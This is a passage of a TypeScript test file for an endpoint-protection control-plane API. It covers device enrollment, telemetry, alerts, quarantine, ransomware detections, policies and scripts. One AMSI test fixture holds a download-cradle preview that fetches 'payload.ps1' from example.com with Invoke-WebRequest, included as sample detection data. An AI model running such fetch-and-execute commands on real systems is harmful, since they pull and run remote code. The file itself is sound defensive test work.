      detectedAt: string;
      fingerprint?: string;
      summary: string;
    }>;
  };

  const repeatedPowerShellAlerts = secondAlertsPayload.items.filter(
    (alert) => alert.hostname === "LAB-ENDPOINT-03" && alert.title === "PowerShell execution observed"
  );
  assert.equal(repeatedPowerShellAlerts.length, 1);
  assert.equal(repeatedPowerShellAlerts[0].detectedAt, "2026-04-08T09:05:00Z");
  assert.match(repeatedPowerShellAlerts[0].summary, /PID 7780/i);
  assert.equal(secondAlertsPayload.items.length, 8);

  const persisted = JSON.parse(await readFile(harness.stateFilePath, "utf8")) as {
    alerts: Array<{ hostname: string; title: string; fingerprint?: string }>;
  };
  const persistedPowerShellAlert = persisted.alerts.find(
    (alert) => alert.hostname === "LAB-ENDPOINT-03" && alert.title === "PowerShell execution observed"
  );
  assert.ok(persistedPowerShellAlert);
  assert.equal(persistedPowerShellAlert.fingerprint, `process:${deviceId}:powershell.exe`);
});

test("scan findings generate alerts with quarantine context", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-04",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-0004"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  const { deviceId } = enrollment;

  const sha256 = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
  const ingestResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-scan-001",
          eventType: "scan.finding",
          source: "scannercli",
          summary: "On-demand scan flagged loader.exe for quarantine and moved it into local quarantine.",
          occurredAt: "2026-04-08T09:10:00Z",
          payloadJson:
            "{\"path\":\"C:\\\\Users\\\\matt\\\\Downloads\\\\loader.exe\",\"sizeBytes\":8192,\"sha256\":\"" +
            sha256 +
            "\",\"remediationStatus\":\"quarantined\",\"disposition\":\"quarantine\",\"tacticId\":\"TA0002\",\"techniqueId\":\"T1204.002\",\"quarantineRecordId\":\"qr-001\",\"evidenceRecordId\":\"ev-001\",\"quarantinedPath\":\"C:\\\\ProgramData\\\\AntiVirus\\\\quarantine\\\\files\\\\qr-001.exe.quarantine\",\"remediationError\":\"\"}"
        }
      ]
    }
  });

  assert.equal(ingestResponse.statusCode, 200);
  assert.equal(ingestResponse.json().accepted, 1);

  const alertsResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/alerts"
  });

  assert.equal(alertsResponse.statusCode, 200);
  const alertsPayload = alertsResponse.json() as {
    items: Array<{
      id: string;
      hostname: string;
      title: string;
      severity: string;
      tacticId?: string;
      technique?: string;
      fingerprint?: string;
      summary: string;
    }>;
  };

  const scanAlert = alertsPayload.items.find(
    (alert) => alert.hostname === "LAB-ENDPOINT-04" && alert.title === "Suspicious file quarantined after on-demand scan"
  );
  assert.ok(scanAlert);
  assert.equal(scanAlert.severity, "high");
  assert.equal(scanAlert.technique, "T1204.002");

  const scanDetailResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/alerts/${scanAlert.id}`
  });

  assert.equal(scanDetailResponse.statusCode, 200);
  const scanDetail = scanDetailResponse.json() as {
    alert: { id: string };
    device: { id: string } | null;
    matchingTelemetry: Array<{ eventId: string }>;
    evidence: Array<{ recordId: string }>;
    quarantineItems: Array<{ recordId: string }>;
    scanHistory: Array<{ eventId: string }>;
  };
  assert.equal(scanDetail.alert.id, scanAlert.id);
  assert.equal(scanDetail.device?.id, deviceId);
  assert.ok(scanDetail.matchingTelemetry.some((item) => item.eventId === "evt-scan-001"));
  assert.ok(scanDetail.evidence.some((item) => item.recordId === "ev-001"));
  assert.ok(scanDetail.quarantineItems.some((item) => item.recordId === "qr-001"));
  assert.ok(scanDetail.scanHistory.some((item) => item.eventId === "evt-scan-001"));

  const missingAlertResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/alerts/missing-alert"
  });

  assert.equal(missingAlertResponse.statusCode, 404);
  assert.equal(missingAlertResponse.json().error, "alert_not_found");
  assert.equal(scanAlert.fingerprint, `scan:${deviceId}:${sha256}`);
  assert.match(scanAlert.summary, /SHA-256/i);
  assert.match(scanAlert.summary, /Local quarantine completed successfully/i);
});

test("AMSI scan findings retain script context in alert and device detail", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-04-AMSI",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-0004-AMSI"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  const { deviceId } = enrollment;

  const preview = "Write-Host hello; Invoke-WebRequest https://example.com/payload.ps1";
  const ingestResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-amsi-001",
          eventType: "scan.finding",
          source: "amsi-provider",
          summary: "AMSI provider blocked PowerShell content after detecting a suspicious download cradle.",
          occurredAt: "2026-04-08T09:11:00Z",
          payloadJson:
            "{\"path\":\"memory://PowerShell/42\",\"sizeBytes\":1536,\"sha256\":\"2222222222222222222222222222222222222222222222222222222222222222\",\"disposition\":\"block\",\"remediationStatus\":\"none\",\"tacticId\":\"TA0002\",\"techniqueId\":\"T1059.001\",\"evidenceRecordId\":\"ev-amsi-001\",\"appName\":\"PowerShell\",\"contentName\":\"C:\\\\Users\\\\lab\\\\Downloads\\\\launch.ps1\",\"source\":\"stream\",\"sessionId\":42,\"preview\":\"" +
            preview +
            "\"}"
        }
      ]
    }
  });

  assert.equal(ingestResponse.statusCode, 200);
  assert.equal(ingestResponse.json().accepted, 1);

  const alertsResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/alerts"
  });

  assert.equal(alertsResponse.statusCode, 200);
  const alertsPayload = alertsResponse.json() as {
    items: Array<{
      id: string;
      hostname: string;
      title: string;
      severity: string;
      tacticId?: string;
      technique?: string;
      fingerprint?: string;
      summary: string;
    }>;
  };

  const scanAlert = alertsPayload.items.find(
    (alert) => alert.hostname === "LAB-ENDPOINT-04-AMSI" && alert.title === "Suspicious PowerShell content blocked after AMSI inspection"
  );
  assert.ok(scanAlert);
  assert.equal(scanAlert?.severity, "high");
  assert.equal(scanAlert.tacticId, "TA0002");
  assert.equal(scanAlert?.technique, "T1059.001");
  assert.match(scanAlert?.summary ?? "", /AMSI app: PowerShell/i);
  assert.match(scanAlert?.summary ?? "", /Source type: stream/i);
  assert.match(scanAlert?.summary ?? "", /Preview: Write-Host hello/i);

  const deviceDetailResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${deviceId}`
  });

  assert.equal(deviceDetailResponse.statusCode, 200);
  const deviceDetail = deviceDetailResponse.json() as {
    evidence: Array<{
      recordId: string;
      subjectPath: string;
      appName?: string;
      contentName?: string;
      sourceType?: string;
      sessionId?: number;
      preview?: string;
    }>;
    scanHistory: Array<{
      eventId: string;
      subjectPath: string;
      appName?: string;
      contentName?: string;
      sourceType?: string;
      sessionId?: number;
      preview?: string;
    }>;
  };

  assert.equal(deviceDetail.evidence.length, 1);
  assert.equal(deviceDetail.evidence[0].appName, "PowerShell");
  assert.equal(deviceDetail.evidence[0].contentName, "C:\\Users\\lab\\Downloads\\launch.ps1");
  assert.equal(deviceDetail.evidence[0].sourceType, "stream");
  assert.equal(deviceDetail.evidence[0].sessionId, 42);
  assert.match(deviceDetail.evidence[0].preview ?? "", /Write-Host hello/i);

  assert.equal(deviceDetail.scanHistory.length, 1);
  assert.equal(deviceDetail.scanHistory[0].appName, "PowerShell");
  assert.equal(deviceDetail.scanHistory[0].contentName, "C:\\Users\\lab\\Downloads\\launch.ps1");
  assert.equal(deviceDetail.scanHistory[0].sourceType, "stream");
  assert.equal(deviceDetail.scanHistory[0].sessionId, 42);
  assert.match(deviceDetail.scanHistory[0].preview ?? "", /Invoke-WebRequest/i);

  const alertDetailResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/alerts/${scanAlert?.id}`
  });

  assert.equal(alertDetailResponse.statusCode, 200);
  const alertDetail = alertDetailResponse.json() as {
    evidence: Array<{
      appName?: string;
      contentName?: string;
      sourceType?: string;
      sessionId?: number;
      preview?: string;
    }>;
    playbook: {
      mode: string;
      title: string;
      summary: string;
      evidenceToPreserve: string[];
      actions: Array<{
        id: string;
        category: string;
        title: string;
        detail: string;
        reason: string;
        commandType?: string;
        targetPath?: string;
        automationEligible: boolean;
        approvalRequired: boolean;
      }>;
    };
    scanHistory: Array<{
      appName?: string;
      contentName?: string;
      sourceType?: string;
      sessionId?: number;
      preview?: string;
    }>;
    behaviorChain: {
      score: number;
      tacticIds: string[];
      steps: Array<{ category: string; blocked?: boolean; tacticId?: string; techniqueId?: string }>;
    };
  };

  assert.ok(alertDetail.behaviorChain.score >= 60);
  assert.equal(alertDetail.behaviorChain.steps.some((step) => step.category === "script" && step.blocked), true);
  assert.equal(alertDetail.behaviorChain.tacticIds.includes("TA0002"), true);
  assert.equal(alertDetail.playbook.mode, "cleanup");
  assert.ok(alertDetail.playbook.actions.some((action) => action.commandType === "scan.targeted"));
  assert.ok(alertDetail.playbook.actions.some((action) => action.commandType === "persistence.cleanup"));
  assert.equal(
    alertDetail.playbook.actions.find((action) => action.commandType === "scan.targeted")?.targetPath,
    "C:\\Users\\lab\\Downloads\\launch.ps1"
  );
  assert.equal(alertDetail.evidence[0].contentName, "C:\\Users\\lab\\Downloads\\launch.ps1");
  assert.equal(alertDetail.evidence[0].sourceType, "stream");
  assert.equal(alertDetail.scanHistory[0].appName, "PowerShell");
  assert.equal(alertDetail.scanHistory[0].sessionId, 42);
  assert.match(alertDetail.scanHistory[0].preview ?? "", /Write-Host hello/i);
});

test("device commands can be queued, polled, completed, and quarantine inventory updates", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-05",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-0005"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  const { deviceId } = enrollment;

  const queueResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/commands`,
    headers: harness.adminHeaders,
    payload: {
      type: "scan.targeted",
      issuedBy: "soc-tier3",
      targetPath: "C:\\Users\\lab\\Downloads"
    }
  });

  assert.equal(queueResponse.statusCode, 201);
  const queuedCommand = queueResponse.json() as { id: string; status: string; targetPath?: string };
  assert.equal(queuedCommand.status, "pending");
  assert.equal(queuedCommand.targetPath, "C:\\Users\\lab\\Downloads");

  const heartbeatResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/heartbeat`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      agentVersion: "0.1.1-alpha",
      platformVersion: "platform-0.1.1",
      healthState: "healthy",
      isolated: false
    }
  });

  assert.equal(heartbeatResponse.statusCode, 200);
  assert.equal(heartbeatResponse.json().commandsPending, 1);

  const pollResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${deviceId}/commands/pending?limit=10`,
    headers: deviceAuthHeaders(enrollment)
  });

  assert.equal(pollResponse.statusCode, 200);
  const pollPayload = pollResponse.json() as {
    items: Array<{ id: string; status: string; issuedBy: string; targetPath?: string }>;
  };
  assert.equal(pollPayload.items.length, 1);
  assert.equal(pollPayload.items[0].id, queuedCommand.id);
  assert.equal(pollPayload.items[0].status, "in_progress");
  assert.equal(pollPayload.items[0].issuedBy, "soc-tier3");

  const completeResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/commands/${queuedCommand.id}/complete`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      status: "completed",
      resultJson: "{\"findingCount\":2}"
    }
  });

  assert.equal(completeResponse.statusCode, 200);
  assert.equal(completeResponse.json().status, "completed");

  const commandsResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/commands?deviceId=${deviceId}`
  });

  assert.equal(commandsResponse.statusCode, 200);
  assert.equal(commandsResponse.json().items[0].status, "completed");

  const quarantineIngest = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-q-001",
          eventType: "scan.finding",
          source: "agent-service",
          summary: "On-demand scan flagged seed.exe for quarantine and moved it into local quarantine.",
          occurredAt: "2026-04-08T09:20:00Z",
          payloadJson:
            "{\"path\":\"C:\\\\Users\\\\lab\\\\Downloads\\\\seed.exe\",\"sizeBytes\":1024,\"sha256\":\"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\",\"remediationStatus\":\"quarantined\",\"disposition\":\"quarantine\",\"tacticId\":\"TA0002\",\"techniqueId\":\"T1204.002\",\"quarantineRecordId\":\"qr-lab-001\",\"evidenceRecordId\":\"ev-lab-001\",\"quarantinedPath\":\"C:\\\\ProgramData\\\\AntiVirus\\\\quarantine\\\\files\\\\qr-lab-001.exe.quarantine\",\"remediationError\":\"\"}"
        }
      ]
    }
  });

  assert.equal(quarantineIngest.statusCode, 200);

  const quarantineResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/quarantine?deviceId=${deviceId}`
  });

  assert.equal(quarantineResponse.statusCode, 200);
  assert.equal(quarantineResponse.json().items.length, 1);
  assert.equal(quarantineResponse.json().items[0].status, "quarantined");

  const restoreIngest = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-q-002",
          eventType: "quarantine.restored",
          source: "command-executor",
          summary: "A quarantined item was restored after a remote action.",
          occurredAt: "2026-04-08T09:25:00Z",
          payloadJson:
            "{\"recordId\":\"qr-lab-001\",\"originalPath\":\"C:\\\\Users\\\\lab\\\\Downloads\\\\seed.exe\",\"quarantinedPath\":\"C:\\\\ProgramData\\\\AntiVirus\\\\quarantine\\\\files\\\\qr-lab-001.exe.quarantine\"}"
        }
      ]
    }
  });

  assert.equal(restoreIngest.statusCode, 200);

  const quarantineAfterRestore = await harness.app.inject({
    method: "GET",
    url: `/api/v1/quarantine?deviceId=${deviceId}`
  });

  assert.equal(quarantineAfterRestore.statusCode, 200);
  assert.equal(quarantineAfterRestore.json().items[0].status, "restored");
});

test("older persisted state without telemetry still loads cleanly", async (t) => {
  const legacyState = {
    defaultPolicy: {
      id: "policy-default",
      name: "Business Baseline",
      revision: "2026.04.08.1",
      realtimeProtection: true,
      cloudLookup: true,
      scriptInspection: true,
      networkContainment: false
    },
    devices: [],
    alerts: []
  };

  const harness = await createTestAppWithState(legacyState);
  t.after(async () => {
    await harness.cleanup();
  });

  const dashboardResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });

  assert.equal(dashboardResponse.statusCode, 200);
  assert.equal(dashboardResponse.json().recentTelemetry.length, 0);

  const telemetryResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/telemetry"
  });

  assert.equal(telemetryResponse.statusCode, 200);
  assert.equal(telemetryResponse.json().items.length, 0);
});

test("live-mode store strips persisted demo records", async (t) => {
  const harness = await createTestAppWithState(createSeedState("2026-04-08T10:00:00Z"));
  t.after(async () => {
    await harness.cleanup();
  });

  const liveStore = createFileBackedControlPlaneStore({
    stateFilePath: harness.stateFilePath,
    commandChannelUrl: "wss://test.local/api/v1/commands",
    now: () => "2026-04-08T10:10:00Z",
    seedDemoData: false
  });
  const liveApp = buildServer({ store: liveStore });
  await liveApp.ready();
  t.after(async () => {
    await liveApp.close();
  });

  const dashboardResponse = await liveApp.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });

  assert.equal(dashboardResponse.statusCode, 200);
  assert.equal(dashboardResponse.json().devices.length, 0);
  assert.equal(dashboardResponse.json().alerts.length, 0);
});

test("device detail, evidence, scan history, and posture are derived from agent telemetry", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-06",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-0006"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  const { deviceId } = enrollment;

  const telemetryResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-posture-001",
          eventType: "tamper.protection.ready",
          source: "agent-service",
          summary: "Tamper protection is configured and runtime paths are hardened.",
          occurredAt: "2026-04-08T09:30:00Z",
          payloadJson:
            "{\"registryConfigured\":true,\"runtimePathsProtected\":true,\"uninstallProtectionEnabled\":true}"
        },
        {
          eventId: "evt-posture-002",
          eventType: "process.etw.failed",
          source: "agent-service",
          summary: "The ETW process sensor could not open the kernel session in the current context.",
          occurredAt: "2026-04-08T09:30:01Z",
          payloadJson: "{\"errorCode\":5}"
        },
        {
          eventId: "evt-scan-telemetry-001",
          eventType: "scan.finding",
          source: "scannercli",
          summary: "On-demand scan quarantined payroll-loader.exe after content inspection and heuristic scoring.",
          occurredAt: "2026-04-08T09:30:02Z",
          payloadJson:
            "{\"path\":\"C:\\\\Users\\\\lab\\\\Downloads\\\\payroll-loader.exe\",\"sizeBytes\":24576,\"sha256\":\"1111111111111111111111111111111111111111111111111111111111111111\",\"contentType\":\"portable-executable\",\"reputation\":\"unsigned-user-writable\",\"signer\":\"Unsigned\",\"heuristicScore\":91,\"confidence\":99,\"archiveEntryCount\":0,\"disposition\":\"quarantine\",\"remediationStatus\":\"quarantined\",\"tacticId\":\"TA0002\",\"techniqueId\":\"T1204.002\",\"quarantineRecordId\":\"qr-lab-telemetry-001\",\"evidenceRecordId\":\"ev-lab-telemetry-001\",\"quarantinedPath\":\"C:\\\\ProgramData\\\\AntiVirus\\\\quarantine\\\\files\\\\qr-lab-telemetry-001.exe.quarantine\",\"remediationError\":\"\"}"
        }
      ]
    }
  });

  assert.equal(telemetryResponse.statusCode, 200);
  assert.equal(telemetryResponse.json().accepted, 3);

  const detailResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/devices/${deviceId}`
  });

  assert.equal(detailResponse.statusCode, 200);
  const detailPayload = detailResponse.json() as {
    device: { hostname: string; postureState: string; lastTelemetryAt: string | null; quarantinedItemCount: number };
    posture: { overallState: string; etwState: string; tamperProtectionState: string; runtimePathsProtected?: boolean };
    evidence: Array<{ recordId: string; subjectPath: string; reputation?: string; signer?: string }>;
    scanHistory: Array<{ eventId: string; subjectPath: string; remediationStatus?: string; confidence?: number }>;
    quarantineItems: Array<{ recordId: string; status: string }>;
  };

  assert.equal(detailPayload.device.hostname, "LAB-ENDPOINT-06");
  assert.equal(detailPayload.device.postureState, "failed");
  assert.equal(detailPayload.device.lastTelemetryAt, "2026-04-08T09:30:02Z");
  assert.equal(detailPayload.device.quarantinedItemCount, 1);
  assert.equal(detailPayload.posture.overallState, "failed");
  assert.equal(detailPayload.posture.etwState, "failed");
  assert.equal(detailPayload.posture.tamperProtectionState, "ready");
  assert.equal(detailPayload.posture.runtimePathsProtected, true);
  assert.equal(detailPayload.evidence.length, 1);
  assert.equal(detailPayload.evidence[0].recordId, "ev-lab-telemetry-001");
  assert.match(detailPayload.evidence[0].subjectPath, /payroll-loader\.exe/i);
  assert.equal(detailPayload.evidence[0].reputation, "unsigned-user-writable");
  assert.equal(detailPayload.scanHistory.length, 1);
  assert.equal(detailPayload.scanHistory[0].eventId, "evt-scan-telemetry-001");
  assert.equal(detailPayload.scanHistory[0].remediationStatus, "quarantined");
  assert.equal(detailPayload.scanHistory[0].confidence, 99);
  assert.equal(detailPayload.quarantineItems[0].recordId, "qr-lab-telemetry-001");
  assert.equal(detailPayload.quarantineItems[0].status, "quarantined");

  const evidenceResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/evidence?deviceId=${deviceId}&limit=10`
  });

  assert.equal(evidenceResponse.statusCode, 200);
  assert.equal(evidenceResponse.json().items.length, 1);
  assert.equal(evidenceResponse.json().items[0].recordId, "ev-lab-telemetry-001");

  const scanHistoryResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/scan-history?deviceId=${deviceId}&limit=10`
  });

  assert.equal(scanHistoryResponse.statusCode, 200);
  assert.equal(scanHistoryResponse.json().items.length, 1);
  assert.equal(scanHistoryResponse.json().items[0].eventId, "evt-scan-telemetry-001");
});

test("ransomware-oriented scan findings generate critical recovery and encryption alerts", async (t) => {
  const harness = await createTestAppWithState({
    defaultPolicy: {
      id: "policy-default",
      name: "Business Baseline",
      revision: "2026.04.08.1",
      realtimeProtection: true,
      cloudLookup: true,
      scriptInspection: true,
      networkContainment: false
    },
    devices: [],
    alerts: [],
    telemetry: [],
    commands: [],
    quarantineItems: [],
    evidence: [],
    scanHistory: [],
    devicePosture: []
  });
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-RANSOM",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-RANSOM-01"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
  const { deviceId } = enrollment;

  const telemetryResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-ransom-001",
          eventType: "scan.finding",
          source: "amsi-provider",
          summary: "AMSI provider blocked cleanup.ps1 after it attempted to delete shadow copies and disable recovery settings.",
          occurredAt: "2026-04-08T11:00:00Z",
          payloadJson:
            "{\"path\":\"C:\\\\Users\\\\lab\\\\Downloads\\\\cleanup.ps1\",\"sizeBytes\":4096,\"sha256\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"contentType\":\"script\",\"reputation\":\"unknown\",\"signer\":\"\",\"heuristicScore\":92,\"confidence\":99,\"archiveEntryCount\":0,\"disposition\":\"block\",\"remediationStatus\":\"none\",\"tacticId\":\"TA0040\",\"techniqueId\":\"T1490\",\"quarantineRecordId\":\"\",\"evidenceRecordId\":\"ev-ransom-001\",\"quarantinedPath\":\"\",\"remediationError\":\"\"}"
        },
        {
          eventId: "evt-ransom-002",
          eventType: "scan.finding",
          source: "scannercli",
          summary: "On-demand scan quarantined HOW_TO_RESTORE_FILES.txt after it matched ransomware-note content.",
          occurredAt: "2026-04-08T11:00:01Z",
          payloadJson:
            "{\"path\":\"C:\\\\Users\\\\lab\\\\Desktop\\\\HOW_TO_RESTORE_FILES.txt\",\"sizeBytes\":2048,\"sha256\":\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\",\"contentType\":\"binary\",\"reputation\":\"unknown\",\"signer\":\"\",\"heuristicScore\":89,\"confidence\":97,\"archiveEntryCount\":0,\"disposition\":\"quarantine\",\"remediationStatus\":\"quarantined\",\"tacticId\":\"TA0040\",\"techniqueId\":\"T1486\",\"quarantineRecordId\":\"qr-ransom-002\",\"evidenceRecordId\":\"ev-ransom-002\",\"quarantinedPath\":\"C:\\\\ProgramData\\\\AntiVirus\\\\quarantine\\\\files\\\\qr-ransom-002.txt.quarantine\",\"remediationError\":\"\"}"
        }
      ]
    }
  });

  assert.equal(telemetryResponse.statusCode, 200);

  const alertsResponse = await harness.app.inject({
    method: "GET",
    url: `/api/v1/alerts?deviceId=${deviceId}`
  });

  assert.equal(alertsResponse.statusCode, 200);
  const items = alertsResponse.json().items as Array<{ title: string; severity: string; technique?: string; summary: string }>;
  assert.equal(items.length, 2);

  const recoveryAlert = items.find((item) => item.technique === "T1490");
  assert.ok(recoveryAlert);
  assert.equal(recoveryAlert.severity, "critical");
  assert.match(recoveryAlert.title, /recovery-inhibition/i);
  assert.match(recoveryAlert.summary, /T1490/i);

  const encryptionAlert = items.find((item) => item.technique === "T1486");
  assert.ok(encryptionAlert);
  assert.equal(encryptionAlert.severity, "critical");
  assert.match(encryptionAlert.title, /ransomware/i);
  assert.match(encryptionAlert.summary, /T1486/i);
});

test("policies and stored scripts can be managed and dispatched to endpoints", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const createPolicyResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/policies",
    headers: harness.adminHeaders,
    payload: {
      name: "High Containment",
      description: "Aggressive response profile for high-risk devices.",
      realtimeProtection: true,
      cloudLookup: true,
      scriptInspection: true,
      networkContainment: true,
      quarantineOnMalicious: true
    }
  });

  assert.equal(createPolicyResponse.statusCode, 201);
  const createdPolicy = createPolicyResponse.json() as { id: string; name: string; networkContainment: boolean };
  assert.equal(createdPolicy.name, "High Containment");
  assert.equal(createdPolicy.networkContainment, true);

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-POLICY",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-POLICY-01"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string };

  const assignPolicyResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/policies/${createdPolicy.id}/assign`,
    headers: harness.adminHeaders,
    payload: {
      deviceIds: [enrollment.deviceId]
    }
  });

  assert.equal(assignPolicyResponse.statusCode, 200);
  assert.equal(assignPolicyResponse.json().assignedDeviceIds[0], enrollment.deviceId);

  const createScriptResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/scripts",
    headers: harness.adminHeaders,
    payload: {
      name: "Collect triage package",
      description: "Collect a quick triage bundle from the endpoint.",
      language: "powershell",
      content: "Write-Output 'collecting triage package'"
    }
  });

  assert.equal(createScriptResponse.statusCode, 201);
  const createdScript = createScriptResponse.json() as { id: string; name: string };
  assert.equal(createdScript.name, "Collect triage package");

  const updateScriptResponse = await harness.app.inject({
    method: "PATCH",
    url: `/api/v1/scripts/${createdScript.id}`,
    headers: harness.adminHeaders,
    payload: {
      description: "Collect a quick triage bundle and stage it for upload."
    }
  });

  assert.equal(updateScriptResponse.statusCode, 200);
  assert.match(updateScriptResponse.json().description, /stage it for upload/i);

  const runScriptResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/actions/run-script`,
    headers: harness.adminHeaders,
    payload: {
      scriptId: createdScript.id,
      issuedBy: "soc-tier3"
    }
  });

  assert.equal(runScriptResponse.statusCode, 201);
  const queuedCommand = runScriptResponse.json() as { type: string; payloadJson: string; issuedBy: string };
  assert.equal(queuedCommand.type, "script.run");
  assert.equal(queuedCommand.issuedBy, "soc-tier3");
  assert.match(queuedCommand.payloadJson, /Collect triage package/);

  const dashboardResponse = await harness.app.inject({
    method: "GET",
    url: "/api/v1/dashboard"
  });

  assert.equal(dashboardResponse.statusCode, 200);
  const dashboardPayload = dashboardResponse.json() as {
    devices: Array<{ id: string; policyId: string; policyName: string }>;
    policies: Array<{ id: string; assignedDeviceIds: string[] }>;
    scripts: Array<{ id: string }>;
  };

  const assignedDevice = dashboardPayload.devices.find((item) => item.id === enrollment.deviceId);
  assert.ok(assignedDevice);
  assert.equal(assignedDevice.policyId, createdPolicy.id);
  assert.equal(assignedDevice.policyName, "High Containment");

  const storedPolicy = dashboardPayload.policies.find((item) => item.id === createdPolicy.id);
  assert.ok(storedPolicy);
  assert.equal(storedPolicy.assignedDeviceIds[0], enrollment.deviceId);
  assert.ok(dashboardPayload.scripts.some((item) => item.id === createdScript.id));
});

test("device inventory telemetry populates endpoint summary and installed software detail", async (t) => {
  const harness = await createTestApp();
  t.after(async () => {
    await harness.cleanup();
  });

  const enrollResponse = await harness.app.inject({
    method: "POST",
    url: "/api/v1/enroll",
    payload: {
      hostname: "LAB-ENDPOINT-INVENTORY",
      osVersion: "Windows 11 24H2",
      serialNumber: "LAB-INVENTORY-01"
    }
  });

  assert.equal(enrollResponse.statusCode, 201);
  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };

  const inventoryResponse = await harness.app.inject({
    method: "POST",
    url: `/api/v1/devices/${enrollment.deviceId}/telemetry`,
    headers: deviceAuthHeaders(enrollment),
    payload: {
      events: [
        {
          eventId: "evt-device-inventory-001",
          eventType: "device.inventory.snapshot",
          source: "device-inventory",
          summary: "Fenrir refreshed the local user, address, and software inventory.",
          occurredAt: "2026-04-08T12:00:00Z",
          payloadJson: JSON.stringify({
            privateIpAddresses: ["10.0.10.24", "192.168.1.20"],
            lastLoggedOnUser: "CONTOSO\\matt.admin",
            installedSoftware: [
              {
                id: "software-001",
                displayName: "Contoso VPN",
                displayVersion: "7.2.1",
                publisher: "Contoso",
                installLocation: "C:\\Program Files\\Contoso VPN",
                uninstallCommand: "msiexec /x {CONTOSO-VPN}",
                quietUninstallCommand: "msiexec /x {CONTOSO-VPN} /qn",
                installDate: "20260401",
                displayIconPath: "C:\\Program Files\\Contoso VPN\\vpn.exe",
                executableNames: ["vpn.exe"],
                blocked: false,
                updateState: "available",
